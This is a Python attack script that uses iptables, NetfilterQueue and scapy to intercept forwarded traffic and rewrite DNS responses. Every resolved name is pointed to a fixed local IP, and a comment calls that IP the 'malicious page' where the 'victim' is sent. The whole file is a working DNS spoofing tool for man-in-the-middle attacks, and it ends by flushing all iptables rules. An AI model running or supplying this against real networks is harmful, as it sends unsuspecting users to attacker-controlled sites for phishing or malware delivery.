#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess


def add_rules():
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] iptables rules added successfully.")


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        print(f"[+] Spoofing DNS request for: {qname}")
        answer = scapy.DNSRR(rrname=qname, rdata="192.168.88.133") # put in rdata the ip of malicious page u need to redirect the victim
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1

        if scapy_packet.haslayer(scapy.IP):
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum

        if scapy_packet.haslayer(scapy.UDP):
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

        packet.set_payload(bytes(scapy_packet))
        packet.accept()  # Accept the modified packet
        return

    packet.accept()  # Accept unmodified packets


try:
    add_rules()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.run(["iptables", "--flush"])
    print("\n[+] iptables rules removed.\n")
